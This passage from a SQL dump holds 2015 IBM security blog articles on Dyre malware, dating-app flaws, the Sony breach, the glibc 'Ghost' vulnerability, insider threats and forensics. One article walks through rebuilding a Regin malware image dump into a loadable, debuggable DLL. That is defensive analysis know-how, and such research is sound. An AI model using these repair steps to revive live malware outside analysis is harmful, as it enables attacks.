INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (462, 'Cybercriminals Leverage Massively Distributed Malware in APT-Style Attacks', 'Dana Tamir', '2015-2-17', 'Since mid-2014, cybercriminals have used large distribution campaigns to infect millions of machines with the  , a massively distributed malware. First identified in June 2014 as a malware that primarily steals banking credentials, Dyre has undergone many changes in a very short period. In September 2014, a variant of the Trojan was used to target business data by capturing employees’ credentials when they logged into SalesForce.com. Another variant now uses some noteworthy propagation and evasion techniques. Machines compromised by   are at risk of credential theft and other types of threats. Since Dyre can receive new operational commands from the command-and-control (C&C) server, it can be used to target different organizations or download and install additional malware. This combination of capabilities makes Dyre a very dangerous advanced persistent threat (APT) tool. A new variant of the Dyre Trojan was recently discovered by researchers at  . This Dyre variant hijacks Microsoft Outlook to spread the Upatre downloader and infect more users with malware. The attack starts with a spam or spear phishing email disguised as a fax or package delivery details that includes the Upatre downloader. Examples of the spear phishing emails as provided in the   are shown below: After the Upatre payload is delivered to the machine, it contacts a C&C server and delivers the Dyre payload. Dyre then contacts a C&C server and downloads a worm that was detected by Trend Micro and identified as WORM_MAILSPAM.XDP. The worm then uses the Microsoft Outlook email client installed on victims’ devices to send out spear phishing emails with Upatre attached. Then, the cycle repeats. Once the emails are sent, the worm deletes itself so no evidence is left on the machine. An interesting point is that while the worm compromises the victim’s Microsoft Outlook email client, it doesn’t send spam emails to the victim’s contacts. Instead, it gets the email list from the C&C server to select recipients, subject line and message content. Dyre’s evasion techniques, which are designed to help the malware bypass enterprise security controls and remain stealthy on the victim’s machine, are being constantly developed. New evasion techniques added to Dyre include the use of Secure Socket Layers to protect C&C communications, for example. Additionally, a mechanism that enables the Dyre Trojan to find an alternate C&C was added to the Trojan just in case the hard-coded C&Cs aren’t available. This mechanism uses a domain generation algorithm to generate URLs on various top-level domains (cc, ws, to, in, hk, cn, tk and so), similar to the mechanism used by Downad/Conficker malware. Previous   have explained how the Dyre Trojan became a massively distributed APT malware. The following are the general characteristics of massively distributed APT malware: The use of massively distributed malware lets cybercriminals take advantage of millions of machines already infected with the Dyre Trojan, extending their reach by having the Trojan further distribute itself. Since the Trojan acts on instructions provided in the configuration file, new configurations can be used to point it at new targets. According to IBM Security Trusteer research, an average of 1 in 500 machines in the world is infected with massively distributed APT malware. According to Trusteer’s services team, it discovers massively distributed APT malware such as Dyre and Citadel in virtually every customer environment it works with. It is no longer a question of whether machines will become infected; there is a high likelihood systems in your organization are already infected. IBM Trusteer’s endpoint protection solutions,   and  , can provide extensive protection against massively distributed APT malware families, including Dyre,  , Zeus, SpyEye and Shylock. These IBM Trusteer solutions can detect, mitigate and remediate such malware infections. Moreover, the Trusteer Apex and Trusteer Rapport solutions can stop future infections and prevent endpoints from being compromised by applying integrated, multilayered defenses that break the threat life cycle. IBM Trusteer threat research is based on dynamic intelligence feeds from more than 100 million protected endpoints and translates into security updates that are automatically sent to protected endpoints.', '\'Advanced Persistent Threat (APT)\', \'Cyberattack\', \'Dyre\', \'IBM InterConnect\', \'IBM Security Trusteer\', \'Malware\', \'Microsoft\', \'Spear Phishing\', \'Trojan\', \'Trusteer\', \'Trusteer Apex\', \'Trusteer Rapport\', \'watering hole attack\'', 'https://securityintelligence.com/cybercriminals-leverage-massively-distributed-malware-in-apt-style-attacks/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (463, 'A Perfect Match: Uniting Mobile Security With Your Employees’ Use of Online Dating Apps', 'Neil Jones', '2015-2-11', 'New technology has completely revolutionized the dating process. Many people are using mobile dating applications to find their “special someones.” In fact, a recent   study found that 1 in 10 Americans have used a dating site or application, and the number of people who have dated someone they met online has grown to 66 percent over the past eight years. Even though many dating applications are relatively new to the market,   also found that an astonishing 5 percent of Americans who are in a marriage or committed relationship met their significant other online. As the number of dating applications and registered users grows, so does their attractiveness to potential attackers. Powered by   technology, a recent IBM analysis of dating applications revealed the following: The goal of this blog is not to discourage you from using these applications. Rather, its goal is to educate organizations and their users on potential risks and   best practices to use the applications safely. The vulnerabilities IBM discovered are more powerful than you might suspect. Some of them make it possible for cybercriminals to collect valuable personal information about you. Even though certain applications employ privacy measures, IBM found that many are vulnerable to attacks, which can let cybercriminals do the following: Which specific vulnerabilities enable attackers to carry out the exploits mentioned above, permitting them to gain access to your confidential information? IBM’s security researchers determined 26 of the 41 dating applications analyzed on the Android mobile platform either had medium- or high-severity vulnerabilities, which included the following: One of the primary challenges with dating apps is that they operate in a different fashion than other social media sites. Most social media sites encourage you to connect with people you already know. By definition, mobile dating applications encourage you to connect with people you don’t already know. So, what can you do to protect yourself? In addition to encouraging employees to follow  , organizations need to protect themselves from vulnerable dating apps that are active inside their infrastructure. As referred to earlier, IBM found nearly 50 organizations sampled for this research had at least one popular dating app installed on either corporate-owned devices or bring-your-own devices (BYOD). To protect this sensitive data, organizations should consider the following mobile security activities: IBM Security analysts from IBM’s Application Security Research team used IBM Application Security on Cloud to analyze the top 41 dating apps available on Android devices to identify vulnerabilities that can leave users open to potential cyberattacks and threats. Those apps were also analyzed to determine the granted permissions, unveiling a host of excessive privileges. To understand enterprise adoption of these 41 dating apps, app data was analyzed from IBM MaaS360. In advance of releasing this research to the public, IBM Security disclosed all affected app vendors identified with the research. To try a free 30-day trial of IBM Application Security on Cloud, please  .', '\'Application Security\', \'Bring-Your-Own-Device (BYOD)\', \'Cyberattack\', \'Cybercrime\', \'Mobile Security\', \'Vulnerabilities\'', 'https://securityintelligence.com/datingapps/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (464, 'Reviving the Regin Dispatcher Module: Part 1', 'Mark Yason', '2015-2-10', 'This post is the first of my two-part series on Regin’s Stage 4 (32-bit) dispatcher module. In this first part, I will detail the steps I used to rebuild the Regin dispatcher module from an image dump, resulting in a malware sample suitable for both static and  .\n If you are a   or reverse engineer tasked with looking at Regin, you have undoubtedly read the reports from   and  . When looking for a sample, you have also likely come across the Regin sample archive available from  .\n Looking at the samples   and   from the archive, one can find the string   at offset 0x52148:\n \n Interestingly, this means the samples are likely the Stage 4 (32-bit) dispatcher module, which was labeled as the “brain that runs the entire platform.” Since it was a major component of the Regin platform, I deemed it was important to further reverse engineer the samples to understand their functionality.\n However, I quickly encountered a problem. The samples appeared to be just image dumps, and to further complicate the issue, the header was zeroed-out and the first DWORD appeared to be marked with  :\n \n This means that when loading the files in a disassembler, you will see a bunch of unresolved application programming interface (API) calls, such as the following:\n \n Because API calls are one of the major hints a reverse engineer uses to identify the purpose of a particular code, important parts of the code will not be easily found and understood. Additionally, because the samples are not loadable, it would be difficult to perform dynamic analysis, which could further help in understanding the sample. Therefore, for faster and more accurate analysis, the samples would need to be repaired first.\n Using   as the sample, I first copied a header from another dynamic-link library (DLL) — the 32-bit KERNEL32.DLL in my case — and then patched it to the sample. Then, using a PE editor tool ( ), I modified several parts of the PE header.\n  The section headers are modified as follows:\n \n Since the sample is an image dump, the sections are already expanded. Therefore, the raw addresses correspond to virtual addresses.\n Determining where the section starts and ends can be assessed by looking for section paddings (chunks of zeroes) between blocks of code or data. One example is the following section padding, which appears between the   and the   section:\n \n Also, finding which section is  ,  ,  , etc. will involve looking at the initial disassembling of the image dump and inspecting the image dump to determine whether a block of data follows a particular PE data structure.\n  All data directory entries are zeroed-out, and the Import Directory and Export Directory entries are set as follows:\n \n Looking for the Import Directory (import table) involves finding an array of   structures. Since   (+0x0C) points to an imported DLL name, we can use the system DLL names stored in the image dump as hints to where we can find the   For example, the string   found at 0x518C4 what appears to be a valid hint, since the surrounding strings are API names: \n \n Then, to find the   structure for KERNEL32.DLL, we will search for references to 0x518C4, which is eventually found at 0x514FC:\n \n This means 0x514F0 (0x514FC-0x0C) is the start of the   structure for KERNEL32.DLL. Next, the pieces of data surrounding 0x514F0 are inspected to assess the start (0x514DC) and the size (0x8C) of the   array (including the last NULL entry). These values are then set as the values of the Import Directory entry.\n Similarly, looking for the Export Directory (export table) involves finding the   structure. Since   (+0x0C) points to the sample’s original DLL name, we can use the   string as a hint for finding the  . Searching for references to the   address (0x52148) results with 0x5211C:   \n This means the 0x52110 (0x5211C-0x0C) is possibly the start of the  . Therefore, it is set as the value of the Export Directory RVA. The Export Directory size is then assessed to be 0x41 (up to the NULL terminator of the DLL name).\n After the above modifications are made and the repaired sample is loaded in a disassembler, the imports and exports are properly listed:\n \n Furthermore, important parts of the code are easily found and are more understandable because the API calls are resolved:\n \n Now that we have a clean disassembly, the next task would be to continue the repair of the sample so that it can be loaded under a debugger. At a minimum, we need to additionally set the following PE header fields:\n  Identifying the entry point can be an involved task because different compilers and settings will use a different entry point stub. However, for a DLL entry point, we generally can look for a function that is not referenced by any other function that accepts three arguments and uses the APIs called by known DLL entry point stubs as hints. In a Visual Studio installation, the source codes of DLL entry point stubs are available in   and  .\n In this particular case, the cross-references to  , a function called by a DLL entry point stub, eventually led me to the unreferenced function starting at RVA 0x0000AFCC. When analyzed, the function proved to be a valid DLL entry point:\n \n  The size of the image (0x68000) can be computed by adding the highest section’s virtual address with its virtual size and then aligning it to SectionAlignment.\n  The size of the headers is set to 0x1000, which is the total size of the headers aligned with FileAlignment.\n  Since the sample has relocations, relocation information would need to be set. For this, the Relocation Directory RVA is pointed to the   section (0x65000), and the size (0x281C) can be assessed via inspection and then DWORD-aligned.\n After all the above additional modifications, a simple program can be written to load the repaired Regin dispatcher module via   to verify whether the modifications are correct. Once the dispatcher module is loaded, the exported functions can then be resolved (by ordinal value) and then traced under a debugger. Below is the entry of the exported   under a debugger:\n \n In addition to becoming comfortable using reverse engineering tools for  , investing the first chunk of the analysis time on repairing and rebuilding damaged or nonworking modules provides a sample for proper static and dynamic analysis, which will pay great dividends in terms of increased speed and accuracy.\n As I discovered through my continued analysis of the Regin dispatcher module, reviving it was just the first small step toward understanding its complex functionality. In my next blog post, I will share the interesting findings from my research of the Regin dispatcher module’s internals.', '\'IBM X-Force Research\', \'Malware\', \'Regin Dispatcher Module\', \'Symantec\'', 'https://securityintelligence.com/reviving-the-regin-dispatcher-module-part-1/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (465, 'Who Hacked Sony? New Report Raises More Questions About Scandalous Breach', 'Dana Tamir', '2015-2-5', 'On Nov. 21, 2014, Sony Pictures Entertainment executives received extortion emails from a mysterious cybercriminal group warning them of a damaging cyberattack. Three days later, on Nov. 24, Sony discovered internal documents, emails and movies had been leaked and that it had essentially lost control of its IT network. On Dec. 19, 2014, the   announced its investigation had found the North Korean government responsible for the hack. This announcement raised many questions and resulted in substantial criticism. Some security experts were convinced the FBI got it wrong. One security vendor pointed at a   named “Lena” who had worked at Sony for 10 years in a senior technical position until she was laid off in May during a corporate restructuring. Other   said North Korea likely hired cybercriminals from outside the country to help with the attack since it lacks the resources. Now, a new report says it may have actually been a Russian cybercriminal group. According to an article published yesterday by  , Russian cybercriminals used spear-phishing attacks to breach Sony in 2014. The source of this claim is “Yama Tough,” a longtime Russian cybercriminal who said he has been engaged by both the Russian and Ukrainian governments as well as private companies outside of Russia. According to the report, he spoke with another unnamed Russian cybercriminal who claimed he successfully breached Sony’s network by sending spear-phishing emails to Sony employees in Asia and Russia that contained a weaponized PDF attachment. When users opened the attachment, a remote access Trojan (RAT) was secretly loaded onto their machine. The cybercriminals then used an advanced pivoting technique to move inside Sony’s network. The criminals provided samples of Sony documents as proof. The report suggests two possibilities: While it remains unclear who is to blame for this breach, it is obvious that more than one group is after the organization. It is possible that multiple groups worked together to breach the organization’s network. It is important to note that this isn’t the first time Sony has been breached. In 2011, Sony suffered multiple   involving its PlayStation Network, Qriocity (now Music Unlimited), Sony Online Entertainment and other sites. Despite existing controls, enterprises are still breached daily. In many cases, spear-phishing emails are used to initiate the attack and deliver weaponized content. In the alleged Russian hack, for example, the weaponized attachment was a PDF document. It is unclear from the report how the hidden exploit operated to download the RAT to the users’ machines. It may have exploited a vulnerability in Adobe Acrobat or in an embedded object. In any case, it managed to install a RAT on the user’s machine. Once again, the report doesn’t specify which RAT was downloaded, but it claims that it wasn’t detected by the company’s antivirus solution. Considering the various evasion techniques embedded into advanced malware today, this is not surprising. Once the machine was compromised by the RAT, it was used to steal administrator credentials that let the cybercriminals further penetrate the network. According to the  , two out of three breaches involved attackers using stolen or misused credentials. The attack on Sony illustrates that cybercriminals can be motivated by more than just money. The different cybercriminal groups that targeted and breached Sony over the years may have had very different motivations for the attacks. Unfortunately, this means every organization can become a target at one point or another for various reasons. As such, you must be prepared. IBM Security Trusteer Apex advanced malware protection is an endpoint solution designed to   against targeted attacks and advanced threats. Its multilayered approach addresses the various stages of the threat life cycle. In this example, Trusteer Apex protection layers could be used to do the following: Additional protection layers that can be included in Trusteer Apex are Credentials Protection, Advanced Malware Detection and Mitigation and Lockdown for Java. To learn more about Trusteer Apex,  .', '\'Cybersecurity\', \'Data Breach\', \'IBM Security Trusteer\', \'Sony Pictures\', \'Spear Phishing\', \'Trusteer\', \'Trusteer Apex\'', 'https://securityintelligence.com/who-hacked-sony-new-report-raises-more-questions-about-scandalous-breach/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (466, 'Identifying the Insider Threat: The Benign and the Malignant', 'Michelle Alvarez', '2015-2-4', 'Imagine disgruntled employees who oppose the practices of their company. One day, one of these employees downloads sensitive or confidential company documents, announces his or her resignation, then tells the tale to a journalist friend. These unfavorable practices become front-page news, and the company’s public relations and legal teams have to spend millions of dollars to repair the company’s tarnished brand. This fictitious company experienced a very plausible   scenario.\n Do you think your employees are incapable of committing such actions? Thankfully, most are not — but which ones are? The truth is, it makes companies a little uneasy to view employees or co-workers as potential threats. However, this is the reality we live in, and businesses need to consider protecting against the insider threat as they would any other threat. Individuals inside your organization may have an understanding of the company’s weaknesses or have access to areas that an external person may not. This gives them an   since they have no need to bypass protection systems to obtain sensitive information.\n Many are quick to link insider threats to disgruntled employees. However, most breaches are actually unintentional. According to the  , there have been just over 226 million records reported compromised in the United States since 2005 due to unintended disclosure. This means one-fourth of all records compromised are the result of negligence. Unintended disclosure could come in the form of posting information on the company’s public-facing website or sending information to the wrong party via email, fax or mail.\n Though the motivations of malicious insiders vary, there is one motivator that clearly reigns above the rest: financial gain. Sensitive information yields a high return on the black market — more victims equal more money. Financial gain is a popular motive, but it is not the only one. Disgruntled employees may want to retaliate by causing a denial of service or defacing a company’s website. If money-hungry or unhappy employees don’t make a move, there is always  . Insiders sponsored by a national government to perform cyber espionage have become more prevalent. Their goals may vary from website defacement to more serious attacks, such as the destruction of vital infrastructure. Selling or destroying sensitive information or systems are popular avenues. A tech-savvy insider could target known vulnerabilities in an important application to either obtain information or cause other damage. Unauthorized users may have the ability to log in to applications to which they should not have access. Even authorized users could present a problem if their actions aren’t monitored. Accessing rogue and/or insecure Wi-Fi access points is another area of concern. Whether working remotely or from the office, employees often unwittingly open malicious emails and attachments that let attackers exploit the targeted system. Negligent behavior can be just as big of a security risk as malicious conduct. Fortunately, there are a number of solutions available to organizations that mitigate the insider threat. Products that monitor behavior and provide   are key. Focusing on access management and, more specifically,   is an important step toward preventing data breaches. Additionally, by implementing a complete   approach, an organization can go a long way toward fighting against malicious insiders.', '\'Access Management\', \'Data Theft\', \'Insider Threat\', \'Threat Prevention\'', 'https://securityintelligence.com/identifying-the-insider-threat-the-benign-and-the-malignant/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (467, 'Q&A With Dr. Char Sample: What Is Attribution and How Can It Help Fight Attackers?', 'Diana Kelley', '2015-2-4', 'Today, IBM’s Diana Kelley has a special Q&A on attribution with Dr. Char Sample, a research scientist at Carnegie Mellon University. Sample is a 20-year veteran of IT security and software engineering and has a deep expertise in firewalls, Domain Name System Security Extensions and secure network architectures. She is also recognized as the leading expert in quantitative cultural cyberthreat intelligence.  Hello, Diana, and thank you for inviting me to this Q&A. Attribution is another one of those terms that is frequently used but not precisely defined. When I began research in this area, I used the definition of “determining the source identity or location of the intruder.” This definition was paraphrased from “ ,” a 2003 paper by David A. Wheeler and Gregory N. Larsen, but seems to still apply. However, even this definition lacks precision, so once again, everyone will have a different definition. There are many reasons for getting the correct whodunit. The legal aspect is probably the most obvious; however, as the recent   and subsequent response has shown, when countries get involved, the importance of accurate attribution increases dramatically. Unfortunately, as we all know, attribution to an IP address is a nice start but is nowhere near enough. If we can correctly attribute our security events, we can first customize our defenses, and we can do a better job anticipating the intruder’s next steps rather than simply react to the events. Presently, the only way we can accurately attribute attacks is to have direct access to the attacker’s computer. As we all know,   launch attacks off of devices that are several layers deep, involving both owned hosts and proxy servers translating addresses. Because of these well-known hiding methods, new approaches that take attribution beyond the IP address are now being considered; applying cross-discipline research to big data can fuel this. I know I just hit on two buzzwords in the same sentence, so I’ll take a moment to explain. There are several areas of cross-discipline research in terms of cyberbehavior. One of the oldest is the use of linguistics with cyberbehaviors. One problem with this is that the sharing nature of attacks makes this method less than 100 percent. Another area of cross-discipline research combines economics, politics and cyberevents. Finally, there’s the thought of using behavioral models in attribution. This is the area where I am focused. Knowing that everyone has thought habits and these habits are hard, if not impossible, to break, why not learn what these habits mean to cyberevents? Especially since much of our interactions take place faster than we can process, we are already using the automatic thought process. My focus on culture is different because I not only combine social sciences with cyberevents, but I also combine statistical analysis, so my work is quantitative in nature. Actually, another researcher introduced me to Hofstede’s work. Dr. Dominik Güss has been researching how culture influences decision-making, and while I suspected culture would influence cyberbehaviors, I had no framework in mind. Hofstede’s framework appealed because it was easy to understand and the data is quantitative. The quantitative nature of the data provides two advantages. It limits researcher biases when defining a country (I simply examine scores), and it allows for statistical analysis so that findings are more objectively interpreted. We took a look at the Verizon data breaches report and basically looked to see what cultural characteristics the top attackers had in common. Now, I will caution that the data is not raw and not plentiful, so the fidelity of that data is a concern that we called out. However, one theme that this paper hit on and has been supported by other research done by researchers in various countries is that collectivism, which typically occurs with  , tends to negatively impact creativity. Dr. Güss noticed this on his microworld decision-making experiments, and even Yu and Yang in China wrote a paper on how collectivism and the “golden mean” negatively impact creativity, especially in the technical fields. If creativity is not home-grown, the next choice is to either buy it or steal it. So, not surprisingly, we discovered that collectivism and authoritarianism statistically correlated with higher rates of espionage. More recently, I have been looking at cyber and kinetic behaviors and the role of culture in that area. While the results are not yet published, there have been several interesting findings in terms of which countries have adopted cyber as a war domain and their usage patterns. For anyone who’s interested in reading more about this, I maintain a   of papers I’ve written on the subject. At this point, the research is very young and needs lots of funding in order to fulfill its promise. The real goal of this research is to be able to accurately predict an attacker’s next steps and to control the terms of engagement with the attackers. The best I can hope for at this point is for end users to demand better from vendors and service providers. Currently, what passes for most threat intelligence is a collection of known attack steps taken by adversaries over the years. This sounds a lot like the “signature” model used in traditional antivirus, and we saw how well that worked. Threat intelligence needs to benefit from incorporating tools and frameworks from other disciplines; we need to utilize what works from other industries. Users need to push back on vendors and demand more and better products from them. Thank you, Diana, for this opportunity! Have you looked into attribution and Sample’s research? What are your thoughts on how attribution can help with better cyberdefense and threat intelligence? Please let us know in the comments below.', '\'Attribution\', \'Sony Pictures\', \'Threat Intelligence\'', 'https://securityintelligence.com/qa-with-dr-char-sample-what-is-attribution-and-how-can-it-help-fight-attackers/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (468, 'Ghost in the Machine: Linux Zero-Day Vulnerability Opens Door for Attack', 'Pamela Cobb', '2015-1-29', 'On Tuesday, Jan. 27, a zero-day vulnerability (CVE-2015-0235) was disclosed in the Linux operating system that allows malicious code to be executed on servers that use the GNU C Library (glibc) functionality. Linux programs that contain glibc are also affected. The specific call, gethostbyname(), can be triggered by any type of Domain Name System (DNS) resolution within the code, although the primary effect is on systems that accept host names from clients and attempt to resolve them through DNS. In reference to the GetHOST functionality, the vulnerability has been nicknamed “Ghost.” According to  , a heap-based buffer overflow was found in glibc’s __nss_hostname_digits_dots() function, which is used by the gethostbyname() and gethostbyname2() glibc function calls. A remote attacker able to make an application call to either of these functions could use this flaw to execute arbitrary code with the permissions of the user running the application. There are at least three use cases. “Modern” applications likely use getaddrinfo() instead of gethostbyname(). Slightly less modern applications usually call inet_aton() first and only call gethostbyname() after inet_aton() fails. Both of these types of applications are more likely to be safe. The ones most likely to be vulnerable are older applications that use gethostbyname() and are used “itinerantly” or applications that are maintained “not much at all.” Affected versions include glibc-2.2, released on Nov. 10, 2000. Although a patch for this zero-day vulnerability was already issued on May 21, 2013 (between the releases of glibc-2.17 and glibc-2.18), many systems in operation remain unpatched because it was not recognized as a security threat at the time. Newer systems likely shipped with the vulnerability fixed, but this vulnerability remains a threat to older systems and applications, especially in light of the shift from gethostbyname() to getaddrinfo() in applications. The glibc libraries are used by a wide range of services, and the pervasiveness of the glibc library is reminiscent of the   zero-day vulnerability. Ghost is further complicated by the nature of the affected services. Any protocol that allows or requires the client to specify a host to the server to be resolved via DNS is at risk. This includes both the obvious Simple Mail Transfer Protocol HELO/EHLO commands and more subtle protocols where a server will accept a host name from a client to resolve later or pass it on to other servers that would eventually attempt to resolve them via DNS. The nature of glibc and its use means that applying such a patch requires a reboot of the entire affected server, which can hinder many organizations from applying necessary patches due to the disruptive nature of the fix. However, it is more desirable to reboot a server than to have the network compromised by a malicious actor. The vulnerability can be exploited both locally and remotely by all the gethostname*() functions, but this is difficult due to several factors. Only 4 to 8 bytes can be overwritten, and the values written are limited to ASCII periods, digits and the terminating NULL character. In one attack vector, a buffer overflow can be triggered by using a host name argument that appears valid to glibc yet is just off enough to trigger the overflow. This attack could ultimately let the attacker gain complete control over the compromised system by supplying the exploited server with malicious code to execute. All of this can happen without the attacker having any prior knowledge of system credentials, although each case presents its own challenges for exploitation. , which discovered the bug, developed a proof-of-concept exploit that was able to bypass all existing protections. Although the Qualys bypass addressed a handful of specific and common applications, it appears at this point that exploitation attempts must be tightly tailored to the memory layout of the application under attack. Although there may be operational impact, it is important to apply vendor patches. Administrators should be prepared for the inevitable reboots required on servers. Many vendors, such as Red Hat, Debian, Ubuntu and Novell, have released patches that include the original fix from 2013. In addition, clients are encouraged to:', '\'GHOST Vulnerability\', \'Linux\', \'Vulnerability\', \'X-Force\', \'Zero-Day Vulnerability\'', 'https://securityintelligence.com/ghost-in-the-machine-linux-zero-day-vulnerability-opens-door-for-attack/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (469, 'Demystifying the Dark Art of Cyber Forensics', 'Vijay Dheap', '2015-1-29', 'You can tell that a concept is going mainstream when a popular   investigative drama has a spinoff dedicated to the concept. Cybercrime is becoming increasingly commonplace, and cyberthreats abound. So, fittingly, “CSI” is planning a new series focused on cyber forensics: “CSI: Cyber.” It is interesting to see that while many popular law enforcement-oriented TV shows do include a cybersecurity analyst, his or her exploits are most often showcased in an impromptu fashion. However, this new show is expected to depict cyber forensics as a formal practice. Perhaps you should take a cue from Hollywood and look more seriously at how your organization can transition from ad hoc incident responses to implementing a robust cyber forensics practice. Cyber forensics can best be described as an investigative analysis of rich content — full packet data, documents and other artifacts — to reveal the presence, nature, impact and extent of a cyberthreat. If you think that sounds complex and sophisticated, that’s because it is. Becoming a seasoned cyber forensics investigator requires deep technical knowledge and significant experience. Additionally, given the availability of rich content, the data that needs to be mined is voluminous and varied. Therefore, even the most senior forensics experts must spend a significant amount of time wading through data to zero in on nuggets of knowledge about a given security incident. From a security operations standpoint, these properties of cyber forensics make it an expensive proposition. As a result, cyber forensics has traditionally been viewed as a specialty to be called upon only when the situation is dire. However, as cybersecurity takes center stage as a result of a growing number of destructive breaches and cyberattacks, cyber forensics cannot remain a niche capability. The need to democratize the capabilities required for cyber forensics and slash operational costs has never been greater. Only then can cyber forensics be standardized as a practice and be made a first-class citizen in cybersecurity operations. Before unlocking the secrets to making cyber forensics more accessible to a broader set of organizations on a more regular basis, it is important to place cyber forensics within the context of a broader   framework. If you employ the principle of maximizing security value for time and cost investment, it becomes apparent that as an organization develops its security intelligence operations — from log management to security information and event management (SIEM) to flow analytics — the next evolutionary step is cyber forensics. This progression is not sequential but, rather, cumulative, letting the organization minimize the resources it commits to address security incidents while quickly and seamlessly employing sophisticated means to mitigate the risks from  . \n Traditionally, cyber forensics has had a narrow focus on full packet capture and subsequent packet-level analysis. While lossless full packet capture is an essential capability, it does not deliver forensic value; rather, it needs to be employed as the first stage to gain access to a very rich source of content. By acquiring standardized and commoditized technology for packet capture, the cost side of the equation becomes more attractive. Next, while packet-level analysis can reveal malicious or suspicious activity, it can be onerous and time-consuming, especially when dealing with large amounts of packet data. By shifting focus from individual packets to the aggregate payload of a collection of packets, an investigator can gain more clarity about the actual artifacts flowing over the network. Human intuition and logical reasoning can guide the application of specific technical expertise. Not only does this open cyber forensics up to a wider community of security analysts, but it also improves productivity. Organizations often become disillusioned with their forensics efforts when they attempt to employ cyber forensics exclusively to understand security incidents. They incur all the cost of full packet capture and storage of content but minimally focus their analysis on basic metadata associated with network traffic. By employing forensics within the context of an overall security intelligence exercise, infrastructure investments can be minimized while the response time increases. Advanced SIEM and flow analytics can be used to glean insights from basic metadata for most security incidents and narrow the security context for the incidents that require a more in-depth investigation. Forensics focuses on allowing for the rapid retrieval of rich metadata and content relevant to the security incident. By allowing for content-level clarity, forensics can efficiently expose the “how” and “what” behind a security incident. Seasoned cyber forensics investigators employ a specialized set of tools. Not only do each of these tools require training, but the efficacy of the forensics process rests on the expertise of the operator to synthesize the information from the various data inputs of all these tools to unlock knowledge. Given that this model does not scale, building a cyberpractice within an organization requires the deployment of a forensics platform that delivers an integrated set of core forensics capabilities. Interestingly, if you analyze real-world investigative processes, patterns emerge that allude to the required set of core forensics tools — for example, a timeline depiction of events, visualization of entity relationships and categorization of artifacts. The platform also needs to automate the enrichment of data and synthesize information wherever possible to deliver actionable knowledge. A platform approach also lets an organization go beyond just network packet data to other important artifacts from other sources, such as documents from file repositories, event feeds from applications and executable code. Cyber forensics has too much riding on it to remain a niche capability in the cybersecurity field. By focusing more attention on this field, your organization can work to lower risk and improve your  .', '\'Cyber Forensics\', \'Cybersecurity\', \'Data Security\', \'Forensics\', \'Incident Forensics\'', 'https://securityintelligence.com/demystifying-the-dark-art-of-cyber-forensics/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (470, 'How Physical Security Defenses Influence Cybersecurity', 'Chris Meenan', '2015-1-22', 'There is no doubt that today’s cybersecurity arena is dynamic, fast and under constant evolution — indeed, it is seemingly impossible to keep up with. Every day, some breach or another is announced, the next world-ending vulnerability is discovered or the latest big data analytics solution is released that is going to solve everything. It is certainly exciting, but it also increases the risk of not being able to see the forest for the trees.\n One thing I’ve found myself doing and talking about with customers and others in the industry is drawing parallels between cybersecurity and the more mature and well-understood area of physical security. It obviously isn’t completely analogous; for example, someone can’t physically steal from hundreds of individuals from the privacy of their own home or exploit a newly revealed physical weakness in a matter of minutes on a massive scale.\n That said, there are undoubtedly some very interesting parallels between the way we approach “real-life” security and equivalent practices in the cyberworld. The following are some typical behaviors that are intrinsic in how we secure ourselves physically:\n In the office and at home, most of us tend to leave internal doors unlocked and/or enable easy access because we trust the people who are there. However, we typically do not leave valuable jewelry on display, the car keys sitting on the windowsill or a stack of cash on the office desk overnight. We know where our valuables are, and we go to some effort to hide them, lock them down, check on them regularly and generally make sure only those who need them can access them. We know that is what criminals are most likely to be after, so we ensure they are as safe as possible.\n When we are surrounded by people we trust and know well, we tend to be less cautious. We don’t mind leaving our phone and wallet on the table; we talk openly and don’t scrutinize every word in every conversation; we relax and spend less of our efforts on staying secure and apply them to other areas of life. However, when in the presence of strangers or people we have good reason not to trust, we are far more careful. We don’t leave items of value on display, and we are far more aware of conversation so that we don’t reveal anything that can be used against us or important information that would compromise those valuable things.\n Most companies and — increasingly — private individuals that recognize a risk to their valuables will deploy systems to track access to their property, such as CCTV, keycards and phone-tracking apps. Most don’t sit and look at this data all day; instead, they record it and then store it so that should an incident occur, it’s possible to look back and see exactly what happened. For example, we can know who entered, when, how, what they took and whether they left anything behind. Most importantly, we can learn how to stop any breach from happening again in the future.\n For the vast majority of people, physical security is second nature. We lock front doors, we hide our valuables, we don’t leave doors on the “latch,” we close and lock windows and we are immediately more vigilant around people we don’t know and trust. It is bred into us at an early age.\n I think these relate well to the following key approaches to cybersecurity:\n Just like in the physical world, cybercriminals aren’t interested in the equivalent of low-value items in our gardens, halls, etc. They are after our  , such as customer data, account details and intellectual property. Crown jewel access should obviously be restricted only to those who need it, but access to these artifacts should also be specifically monitored for anything outside of “normal” behavior or what business policies dictate.\n There are always activities going on in areas of our networks that we would prefer not to happen, such as click-happy users and dubious application downloads. However, we need to focus our limited resources on what really matters and not put onerous and expensive security processes in place where the risk doesn’t warrant it and where it will not have too much of an impact on day-to-day business processes and life. It should not distract from the really significant security incidents that could affect the business.\n Use network “trust” zones and complement these with external threat intelligence and internal incident detection to understand whom we trust and whom we don’t trust. Then, we should monitor who is communicating with them. This doesn’t mean we should generate a security incident when they do; instead, we should be more cautious and vigilant. For example, we need to worry a lot more about vulnerabilities on assets if they are talking to untrustworthy actors as opposed to the ones we trust. If assets and users are regularly talking to dubious actors, then those should top our watch list. This should also highlight users who might need additional security training. Very importantly, if any of our crown jewels are communicated with by anything untrusted or unnecessary, we should be concerned and react quickly.\n We should be worried about being compromised. Threats are pervasive. The Internet communication vector means they will always have an attack surface, so we must, at a minimum, record everything. We need to ensure our security systems are going to give us the visibility we need when a security incident occurs — and it will occur. We need to record logs, net flows and packet capture data so that when we need it, we have fast and easy access to understand what happened. The last thing we want when an incident occurs is to not be able to tell our stakeholders what happened and how we will prevent 